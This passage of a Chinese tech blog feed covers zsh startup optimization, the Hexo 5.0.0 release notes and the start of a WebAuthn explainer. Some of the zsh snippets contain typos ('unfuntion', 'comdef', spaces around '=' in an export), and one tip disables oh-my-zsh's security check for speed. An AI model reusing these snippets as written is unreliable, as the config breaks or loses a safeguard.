class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\">\n<div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-08-10</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">Hexo 5.0.0 正式发布</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-07-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 